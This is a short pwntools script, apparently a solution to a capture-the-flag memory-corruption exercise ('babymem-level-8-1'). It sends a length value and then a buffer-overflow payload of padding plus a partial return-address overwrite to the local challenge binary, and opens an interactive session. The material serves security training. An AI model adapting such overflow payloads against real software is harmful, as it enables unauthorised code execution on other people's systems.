from pwn import *

elf = ELF('/challenge/babymem-level-8-1')

io = elf.process()

# This must be exact, otherwise a 0x0a appears, for some reasons
io.sendline(b'138')

payload = b'\x00' + b'A'*135 + b'\x06' + b'\x18'
io.sendline(payload)

io.interactive()
